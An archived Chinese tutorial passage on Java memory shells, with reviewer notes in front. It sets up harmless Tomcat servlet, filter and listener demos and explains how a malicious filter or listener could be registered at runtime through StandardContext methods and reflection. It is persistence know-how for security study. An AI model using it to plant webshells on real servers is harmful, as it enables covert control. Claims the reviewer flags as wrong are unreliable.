---
source: "MrWQ/vulnerability-paper"
product: "Java安全研究参考/Tomcat与Spring生命周期"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "三万字原创长文 完全零基础从 0 到 1 掌握 Java 内存马（1）"
prerequisites: "来源所述条件，未列明部分仍待核：声明JDK8u202+Tomcat9.0.85，嵌入实验实际9.0.83；Spring Boot/Framework/Reactor版本多依赖截图，需分别固定"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/hdqwsYtBN_IpaH2DGZLPoA"
id: "vw-f0cbf901d032c61e7f8d7fc1"
entity_id: "ve-f0cbf901d032c61e7f8d7fc1"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：声明JDK8u202+Tomcat9.0.85，嵌入实验实际9.0.83；Spring Boot/Framework/Reactor版本多依赖截图，需分别固定

代码与实验材料：2289行全文读完；主要正常组件demo与需已有代码执行的运行时修改研究，不能视为Tomcat/Spring无需认证新漏洞；未编译/运行任何代码

来源证据范围：W01fh4cker作者博客/微信原文、su18分类、ApacheCON资料及大量具名研究来源，少量链接有空格污染

- **结论使用边界（1）**：Filter/Interceptor比较表包含实质错误；依据：表称Filter在容器初始化时只调用一次，与前文每次doFilter流程矛盾；action/值栈概念混入Spring拦截器，且声称Filter不能获取IOC bean过于绝对。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（2）**：Spring MVC九大组件列表与初始化体系不符；依据：把DispatcherServlet、Controller、ModelAndView、HandlerInterceptor列入九个，却遗漏异常/多部件等策略；应按同版本initStrategies源码校对。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（3）**：响应式API说明和示例类型错误；依据：Mono.delay被称创建空Mono，Mono.whenDelayError例赋Mono&lt;String&gt;；fromCallable并不自行保证异步；WebFlux接口返回必须Mono/Flux与BeanFactory/ApplicationContext全部懒/全部预热均过度概括。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（4）**：组件生命周期与示例用途需校准；依据：@WebListener("/test")值不是URL映射；Wrapper定义注册不等于Servlet实例init；addFilterMapBefore不保证超过所有既有before映射。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（5）**：实验演示不能直接证明生产注入路径；依据：Tomcat Upgrade独立例只是Servlet里new MyUpgrade().accept而没注册Upgrade协议；Executor例是应用自建线程池而非实际替换容器executor；须区分原理demo与后续已有RCE条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（6）**：平台细节与排版需整理；依据：称Valve要配web.xml、默认AJP8009需要版本/配置依据；线程数组索引仅单次调试快照；部分方法名为空、image时间戳尾巴、多截图串行影响阅读。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 【三万字原创长文】完全零基础从 0 到 1 掌握 Java 内存马（1）

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hdqwsYtBN_IpaH2DGZLPoA)

一、前言
====

之前写的零基础学`Fastjson`的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。

本文所讨论的`Java`内存马是`Java`安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了`su18`师傅一年多以前发表在`Goby`社区的这篇文章（`https://nosec.org/home/detail/5049.html`）中给出的分类方式，把整个零基础掌握`java`内存马系列分成了以下几个部分：传统`web`型、`spring`系列框架型、中间件型、其他内存马（`Websocket/Jsp/线程型/RMI`）、`Agent`型内存马、实战内存马打入（`Jetty`/`Weblogic`/`Shiro`/`Struts2`/`GlassFish`/`xxl-job`...）和内存马查杀。

由于公众号文章字数的限制，我会分几次发出。我的博客会持续完整地更新，地址为：`https://w01fh4cker.github.io/2024/02/02/Master_the_Java_memshell_from_0_to_1_with_complete_zero_foundation/`。

也可以在公众号后台回复 “内存马 pdf” 来获取 pdf 版本的《完全零基础从 0 到 1 掌握 Java 内存马（上）.pdf》，这个是我目前已经写完的上半部分，截止至中间件型内存马。

好了，让我们闲话少叙，就此开始。

二、前置知识
======

本篇文章除特殊说明外，使用的是`jdk1.8.0_202`+ `tomcat 9.0.85`，后者下载地址为：

> https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。

2.1 Servlet 容器与 Engine、Host、Context 和 Wrapper
---------------------------------------------

这部分我找了好久，终于在一大堆高深 / 垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。

> 原文地址：https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li

这里组合引用其原文，简单概括，就是：

`Tomcat`设计了四种容器，分别是`Engine`、`Host`、`Context`和`Wrapper`，其关系如下：![](../../.resource/remote/b17c447958efa80266683e2bf7fbfa58e4ff72d6cc67b64bbf8ae10b7c3fbde9.png)

这一点可以从`Tomcat`的配置文件`server.xml`中看出来。

此时，设想这样一个场景：我们此时要访问`https://manage.xxx.com:8080/user/list`，那`tomcat`是如何实现请求定位到具体的`servlet`的呢？为此`tomcat`设计了`Mapper`，其中保存了容器组件与访问路径的映射关系。

然后就开始四步走：

1.  根据协议和端口号选定`Service`和`Engine`。
    
    我们知道`Tomcat`的每个连接器都监听不同的端口，比如`Tomcat`默认的`HTTP`连接器监听`8080`端口、默认的`AJP`连接器监听`8009`端口。上面例子中的 URL 访问的是`8080`端口，因此这个请求会被`HTTP`连接器接收，而一个连接器是属于一个`Service`组件的，这样`Service`组件就确定了。我们还知道一个`Service`组件里除了有多个连接器，还有一个容器组件，具体来说就是一个`Engine`容器，因此`Service`确定了也就意味着`Engine`也确定了。
    
2.  根据域名选定`Host`。
    
    `Service`和`Engine`确定后，`Mapper`组件通过`url`中的域名去查找相应的`Host`容器，比如例子中的`url`访问的域名是`manage.xxx.com`，因此`Mapper`会找到`Host1`这个容器。
    
3.  根据`url`路径找到`Context`组件。
    
    `Host`确定以后，`Mapper`根据`url`的路径来匹配相应的`Web`应用的路径，比如例子中访问的是`/user`，因此找到了`Context1`这个`Context`容器。
    
4.  根据`url`路径找到`Wrapper`（`Servlet`）。
    
    `Context`确定后，`Mapper`再根据`web.xml`中配置的`Servlet`映射路径来找到具体的`Wrapper`和`Servlet`，例如这里的`Wrapper1`的`/list`。
    

![](../../.resource/remote/4ed38b2f74653d796c897c00a34af1bfab1463ffe204623ed358d7fac5fdd52e.png)

这里的`Context`翻译过来就是上下文，它包括`servlet`运行的基本环境；这里的`Wrapper`翻译过来就是包装器，它负责管理一个`servlet`，包括其装载、初始化、执行和资源回收。

关于上图中的连接器的设计，可以继续参考该作者的博文：

> https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de

写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于`tomcat`架构的原理解析：

> https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09

2.2 编写一个简单的 servlet
-------------------

`pom.xml`文件如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
        </dependency>
    </dependencies>

</project>


```

同步下依赖：![](../../.resource/remote/836a8f303df9f9ab335409bff05cce1a91cc2aae171ab048fec9d08faf612953.png)

`TestServlet.java`代码如下：

```
package org.example;
import java.io.IOException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        resp.getWriter().write("hello world");
    }
}


```

然后配置项目运行所需的`tomcat`环境：

![](../../.resource/remote/4253ac9691da2ea6a5520f799295df4f8441fbd15bf2e2084b918da30c097cd8.png)![](../../.resource/remote/403801665199551c4ba932e798eb4ac981de72d16c1209c1d5d2b9b91a347c23.png)![](../../.resource/remote/a5a33d450565e6902f4cb59d691cc86dd33ddcbca8f25990117ec1adc35f7cf4.png)

然后配置`artifacts`，直接点击`fix`：

![](../../.resource/remote/0473f54f1863384cc4e7b95618650fb5fa21726fed60b59fcda3934a4eb6fee7.png)![](../../.resource/remote/cf40e36e119ebc3c3e452b4a6e71b1dfe8535fa27eef984ca1959370a0355e91.png)![](../../.resource/remote/83fa4c4eded58af9378dd7803f82dee6438426eb52ce54912687d45c380573d5.png)![](../../.resource/remote/8683c6316f823b8daee868333a3e00837e98d5658a5109276369b49cc853a384.png)

然后添加`web`模块：

![](../../.resource/remote/532903a067f260f85062f45847fcc4ce130c91ffd853ac5985e804781b0faabb.png)![](../../.resource/remote/c1dca0b64e1d8be5c35312d8e3547481110d2a885dd86b181e53725141db27a4.png)![](../../.resource/remote/59ddac92f0f4596d694a4fbead300303d3b5c9f09024c6c64f869e97a9ca1499.png)

运行之后，访问 http://localhost:8080/testServlet/test：

![](../../.resource/remote/0f34627e6f408519ed748d7207d4a019a429263825e67d414da46065b8352319.png)

2.3 从代码层面看 servlet 初始化与装载流程
---------------------------

主要参考文章：

> https://longlone.top / 安全 / java/java 安全 / 内存马 / Tomcat-Servlet 型 /

我们这里不采用我们下载的`tomcat`来运行我们的项目，我们使用嵌入式`tomcat`也就是所谓的`tomcat-embed-core`。关于动态调试，我是图省事，直接用`tomcat-embed-core`，你当然也可以调试直接调试`tomcat`源码，环境搭建方法可以参考`Skay`师傅的文章：

> https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw

我们重开一个项目，文件代码如下：

`pom.xml`：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-core</artifactId>
            <version>9.0.83</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-jasper</artifactId>
            <version>9.0.83</version>
            <scope>compile</scope>
        </dependency>
    </dependencies>

</project>


```

`Main.java`：

```
package org.example;

import org.apache.catalina.Context;
import org.apache.catalina.LifecycleException;
import org.apache.catalina.startup.Tomcat;
import java.io.File;

public class Main {
    public static void main(String[] args) throws LifecycleException {
        Tomcat tomcat = new Tomcat();
        tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603
        Context context = tomcat.addWebapp("", new File(".").getAbsolutePath());
        Tomcat.addServlet(context, "helloServlet", new HelloServlet());
        context.addServletMappingDecoded("/hello", "helloServlet");
        tomcat.start();
        tomcat.getServer().await();
    }
}


```

`HelloServlet.java`：

```
package org.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/hello")
public class HelloServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("Hello, World!");
        out.println("</body></html>");
    }
}


```

### 2.3.1 servlet 初始化流程分析

我们在`org.apache.catalina.core.StandardWrapper#setServletClass`处下断点调试：

![](../../.resource/remote/9c2c5b32373181130d4f2f8aff9892b05fa3c1d130252aeaaab01f5e701d354f.png)

我们尝试按`Ctrl+左键`追踪它的上层调用位置，但是提示我们找不到，需要按两次`Ctrl+Alt+F7`：

![](../../.resource/remote/3913f3d587bd45e58a7f7b9fd687d5cc182f72536fcdc4dcf3069d6bf28d9a39.png)

然后就可以看到，上层调用位置位于`org.apache.catalina.startup.ContextConfig#configureContext`：

![](../../.resource/remote/4741347bcbaba2e9ed861fed6d7ccf7ce485351b5a96c0beeeda0ac2ff178e25.png)![](../../.resource/remote/03aad9006813be42e95e6095b71306abb7c9880368cc3aa7798adf5a4dc25ecd.png)

接下来我们详细看下面这段代码：![](../../.resource/remote/4f7a25d7fb80ab9905d30d6ec70855a97be70dad8e940bfc52fee626d42b2ead.png)

```
for (ServletDef servlet : webxml.getServlets().values()) {
            Wrapper wrapper = context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
            wrapper.setServletClass(servlet.getServletClass());
            MultipartDef multipartdef = servlet.getMultipartDef();
            if (multipartdef != null) {
                long maxFileSize = -1;
                long maxRequestSize = -1;
                int fileSizeThreshold = 0;

                if(null != multipartdef.getMaxFileSize()) {
                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                }
                if(null != multipartdef.getMaxRequestSize()) {
                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                }
                if(null != multipartdef.getFileSizeThreshold()) {
                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                }

                wrapper.setMultipartConfigElement(new MultipartConfigElement(
                        multipartdef.getLocation(),
                        maxFileSize,
                        maxRequestSize,
                        fileSizeThreshold));
            }
            if (servlet.getAsyncSupported() != null) {
                wrapper.setAsyncSupported(
                        servlet.getAsyncSupported().booleanValue());
            }
            wrapper.setOverridable(servlet.isOverridable());
            context.addChild(wrapper);
        }
        for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }


```

首先通过`webxml.getServlets()`获取的所有`Servlet`定义，并建立循环；然后创建一个`Wrapper`对象，并设置`Servlet`的加载顺序、是否启用（即获取`</load-on-startup>`标签的值）、`Servlet`的名称等基本属性；接着遍历`Servlet`的初始化参数并设置到`Wrapper`中，并处理安全角色引用、将角色和对应链接添加到`Wrapper`中；如果`Servlet`定义中包含文件上传配置，则根据配置信息设置`MultipartConfigElement`；设置`Servlet`是否支持异步操作；通过`context.addChild(wrapper);`将配置好的`Wrapper`添加到`Context`中，完成`Servlet`的初始化过程。

上面大的`for`循环中嵌套的最后一个`for`循环则负责处理`Servlet`的`url`映射，将`Servlet`的`url`与`Servlet`名称关联起来。

也就是说，`Servlet`的初始化主要经历以下六个步骤：

*   创建`Wapper`对象；
    
*   设置`Servlet`的`LoadOnStartUp`的值；
    
*   设置`Servlet`的名称；
    
*   设置`Servlet`的`class`；
    
*   将配置好的`Wrapper`添加到`Context`中；
    
*   将`url`和`servlet`类做映射
    

### 2.3.2 servlet 装载流程分析

我们在`org.apache.catalina.core.StandardWrapper#loadServlet`这里打下断点进行调试，重点关注`org.apache.catalina.core.StandardContext#startInternal`：

![](../../.resource/remote/fc08d9eec841207f25e467409c0245edb33da00c9a13c7fcf1d30db2d219872a.png)

可以看到，装载顺序为`Listener`-->`Filter`-->`Servlet`：

![](../../.resource/remote/10a6f7544f8d965a988006c088bc9dc4ca4c3eb34c950fc9eda36a7a82154c06.png)

可以看到，上面红框中的代码都调用了`org.apache.catalina.core.StandardContext#loadOnStartup`，`Ctrl+左键`跟进该方法，代码如下：

```
public boolean loadOnStartup(Container children[]) {
    TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
    for (Container child : children) {
        Wrapper wrapper = (Wrapper) child;
        int loadOnStartup = wrapper.getLoadOnStartup();
        if (loadOnStartup < 0) {
            continue;
        }
        Integer key = Integer.valueOf(loadOnStartup);
        map.computeIfAbsent(key, k -> new ArrayList<>()).add(wrapper);
    }
    for (ArrayList<Wrapper> list : map.values()) {
        for (Wrapper wrapper : list) {
            try {
                wrapper.load();
            } catch (ServletException e) {
                getLogger().error(
                        sm.getString("standardContext.loadOnStartup.loadException", getName(), wrapper.getName()),
                        StandardWrapper.getRootCause(e));
                if (getComputedFailCtxIfServletStartFails()) {
                    return false;
                }
            }
        }
    }
    return true;
}


```

可以看到，这段代码先是创建一个`TreeMap`，然后遍历传入的`Container`数组，将每个`Servlet`的`loadOnStartup`值作为键，将对应的`Wrapper`对象存储在相应的列表中；如果这个`loadOnStartup`值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个`loadOnStartup`的升序的顺序来加载。

2.4 Filter 容器与 FilterDefs、FilterConfigs、FilterMaps、FilterChain
--------------------------------------------------------------

开头先明确一点，就是`Filter`容器是用于对请求和响应进行过滤和处理的，以下这张图是根据`Skay`师傅文章中的图片重制的：

> https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g

![](../../.resource/remote/ff93e7b5349fccd9613cb3ecc5b0140ddc6dfb68d6cbbc14ddea919536371eff.png)

从上图可以看出，这个`filter`就是一个关卡，客户端的请求在经过`filter`之后才会到`Servlet`，那么如果我们动态创建一个`filter`并且将其放在最前面，我们的`filter`就会最先执行，当我们在`filter`中添加恶意代码，就可以实现命令执行，形成内存马。

这些名词其实很容易理解，首先，需要定义过滤器`FilterDef`，存放这些`FilterDef`的数组被称为`FilterDefs`，每个`FilterDef`定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及`class`等，这一点可以从`org/apache/tomcat/util/descriptor/web/FilterDef.java`的代码中看出来；然后是`FilterDefs`，它只是过滤器的抽象定义，而`FilterConfigs`则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是`FilterMaps`，它是用于将`FilterConfigs`映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的`FilterConfigs`，从而确定要执行的过滤器链；而`FilterChain`是由多个`FilterConfigs`组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照`FilterChain`中的顺序依次执行每个过滤器，对请求进行过滤和处理。

2.5 编写一个简单的 Filter
------------------

我们继续用我们之前在`2.2`中搭建的环境，添加`TestFilter.java`：

```
package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/test")
public class TestFilter implements Filter {

    public void init(FilterConfig filterConfig) {
        System.out.println("[*] Filter初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[*] Filter执行过滤操作");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public void destroy() {
        System.out.println("[*] Filter已销毁");
    }
}


```

跑起来之后，控制台输出`[*] Filter初始化创建`，当我们访问`/test`路由的时候，控制台继续输出`[*] Filter执行过滤操作`，当我们结束`tomcat`的时候，会触发`destroy`方法，从而输出`[*] Filter已销毁`：

![](../../.resource/remote/8f5dd5d78450be7de2cacb5186e035ee216cf88dbd9c90ccab2f7256a1ae8b88.png)

2.6 从代码层面分析 Filter 运行的整体流程
--------------------------

我们在上面的`demo`中的`doFilter`函数这里下断点进行调试：

![](../../.resource/remote/2d9a6f1205a505bc0468be2679fba20c7172bfb53306e502f3619a765fb349b5.png)

跟进`org.apache.catalina.core.StandardWrapperValve#invoke`：

```
filterChain.doFilter(request.getRequest(), response.getResponse());


```

继续跟进变量`filterChain`，找到定义处的代码：

```
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);


```

![](../../.resource/remote/073a66159c1c17088c65eeda158c618131b2bbcd65d75d2577c68706c2edb4e3.png)

查看该方法（`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`）：

```
public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
    if (servlet == null) {
        return null;
    } else {
        ApplicationFilterChain filterChain = null;
        if (request instanceof Request) {
            Request req = (Request)request;
            if (Globals.IS_SECURITY_ENABLED) {
                filterChain = new ApplicationFilterChain();
            } else {
                filterChain = (ApplicationFilterChain)req.getFilterChain();
                if (filterChain == null) {
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                }
            }
        } else {
            filterChain = new ApplicationFilterChain();
        }

        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
        StandardContext context = (StandardContext)wrapper.getParent();
        FilterMap[] filterMaps = context.findFilterMaps();
        if (filterMaps != null && filterMaps.length != 0) {
            DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
            String requestPath = null;
            Object attribute = request.getAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH");
            if (attribute != null) {
                requestPath = attribute.toString();
            }

            String servletName = wrapper.getName();
            FilterMap[] var10 = filterMaps;
            int var11 = filterMaps.length;

            int var12;
            FilterMap filterMap;
            ApplicationFilterConfig filterConfig;
            for(var12 = 0; var12 < var11; ++var12) {
                filterMap = var10[var12];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersURL(filterMap, requestPath)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig != null) {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            var10 = filterMaps;
            var11 = filterMaps.length;

            for(var12 = 0; var12 < var11; ++var12) {
                filterMap = var10[var12];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersServlet(filterMap, servletName)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig != null) {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            return filterChain;
        } else {
            return filterChain;
        }
    }
}


```

我们在该方法和下面定义`filterMaps`那行下断点进行调试，可以看到，这段代码先是判断`servlet`是否为空，如果是就表示没有有效的`servlet`，无法创建过滤器链；然后根据传入的`ServletRequest`的类型来分类处理，如果是`Request`类型，并且启用了安全性，那么就创建一个新的`ApplicationFilterChain`，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的`Servlet`和异步支持属性，这个没啥说的；关键点在于后面从`Wrapper`中获取父级上下文（`StandardContext`），然后获取该上下文中定义的过滤器映射数组（`FilterMap`）；最后遍历过滤器映射数组，根据请求的`DispatcherType`和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。

![](../../.resource/remote/95cbfd4fab9db58392ee7ab97e50fbf4e3fc3736add8995db8a86ecb797b0fbb.png)![](../../.resource/remote/3e4c49f4b571d0ff137acf8316c700691a4fd34ca55cc5e60a9d214f9d509d9e.png)

从上面的两张图我们也可以清晰地看到`filterConfig`、`filterMap`、`FilterDef`的结构。

跟进刚才的`filterChain.doFilter`方法，位于`org.apache.catalina.core.ApplicationFilterChain#doFilter`：

![](../../.resource/remote/cd2afbb8f8aeaf9aa09347ae96c8bec2d963f27bb0e3dfaf74e5d508bf32e7cd.png)

可以看到都是调用了`org.apache.catalina.core.ApplicationFilterChain#internalDoFilter`方法，在这个方法中会依次拿到`filterConfig`和`filter`：

![](../../.resource/remote/107f655ca10caeebfcf3b0a1aacb21a1c6e84e174eee24c1a9372d1b9f0d2f3c.png)

好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个`Filter`，回顾之前的调试过程，我们发现在`createFilterChain`那个函数里面有两个关键点：

![](../../.resource/remote/18f9059059c21592c31a4b17980f6d1bef058c131243259244d97a18ac03cef2.png)

也就是这里我用箭头指出来的`org.apache.catalina.core.StandardContext#findFilterMaps`和`org.apache.catalina.core.StandardContext#findFilterConfig`。

二者的实现代码粘贴如下：

```
public FilterMap[] findFilterMaps() {
    return filterMaps.asArray();
}

public FilterConfig findFilterConfig(String name) {
    synchronized (filterDefs) {
        return filterConfigs.get(name);
    }
}


```

也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。

那也就是说，我们现在的问题就转化为如何添加`filterMap`和`filterConfig`。我们搜索关键词`addFilterMap`，即可看到在`StandardContext`中有两个相关的方法：

![](../../.resource/remote/c13c2713dd28e8118a4b751c4cbecf9292d667868f88b53e296e7f14318e643a.png)

注释里面也说的很清楚，`addFilterMap`是在一组映射末尾添加新的我们自定义的新映射；而`addFilterMapBefore`则会自动把我们创建的`filterMap`丢到第一位去，无需再手动排序，这正是我们需要的呀！

可以看到，上面的`addFilterMapBefore`函数中第一步是先执行`org.apache.catalina.core.StandardContext#validateFilterMap`这个函数，点击去看看：

![](../../.resource/remote/462685607aae07fbd93f29a28b60bfa114ad443181aa0f4880de1c3821eab3e8.png)

发现我们需要保证它在根据`filterName`找`filterDef`的时候，得能找到，也就是说，我们还得自定义`filterDef`并把它加入到`filterDefs`，不过这个也很简单，也有对应的方法，也就是`org.apache.catalina.core.StandardContext#addFilterDef`：

![](../../.resource/remote/04f238fe5ffc13a962cbd61fb161ffabeb42d5aac6557ee4709eabc0146124ff.png)

搞定，继续去看`filterConfig`如何添加。经过搜索发现，不存在类似上面的`addFilterConfig`这种方法：

![](../../.resource/remote/06d5b78d18b7788d0457af52fb14d46409de8b0a8e9bf3d0e409f10c03ae3fbb.png)

但是有`filterStart`和`filterStop`这两个方法：

![](../../.resource/remote/411ff8634d75fc68d2820aa2701fcee496173b524512dbd040e7abd02c118d0f.png)![](../../.resource/remote/3d5f4b57ef69d67b241a8c6fce3d9c58c1b8a168a73c9ef6412455f2b98a5a52.png)

那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。

2.7 Listener 简单介绍
-----------------

![](../../.resource/remote/ae8de0e76a5d81bd6bd4f71166cd1c91c646ce4edd11a5bf41e996654a117020.png)

由上图可知，`Listener`是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的`Listener`，就又可以形成一种内存马了。

在`tomcat`中，常见的`Listener`有以下几种：

*   `ServletContextListener`，用来监听整个`Web`应用程序的启动和关闭事件，需要实现`contextInitialized`和`contextDestroyed`这两个方法；
    
*   `ServletRequestListener`，用来监听`HTTP`请求的创建和销毁事件，需要实现`requestInitialized`和`requestDestroyed`这两个方法；
    
*   `HttpSessionListener`，用来监听`HTTP`会话的创建和销毁事件，需要实现`sessionCreated`和`sessionDestroyed`这两个方法；
    
*   `HttpSessionAttributeListener`，监听`HTTP`会话属性的添加、删除和替换事件，需要实现`attributeAdded`、`attributeRemoved`和`attributeReplaced`这三个方法。
    

很明显，`ServletRequestListener`是最适合做内存马的，因为它只要访问服务就能触发操作。

2.8 编写一个简单的 Listener（ServletRequestListener）
--------------------------------------------

我们继续用我们之前在`2.2`中搭建的环境，替换掉之前的`TestFilter.java`，重新写一个`TestListener.java`：

```
package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebListener;

@WebListener("/test")
public class TestListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("[+] destroy TestListener");
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("[+] initial TestListener");
    }
}


```

运行结果：

![](../../.resource/remote/579bb39ac9dac8403803033f06ad92085660bd6218588ffe92922221ab926ddc.png)

2.9 从代码层面分析 Listener 运行的整体流程
----------------------------

我们在如图所示的两个地方下断点调试：

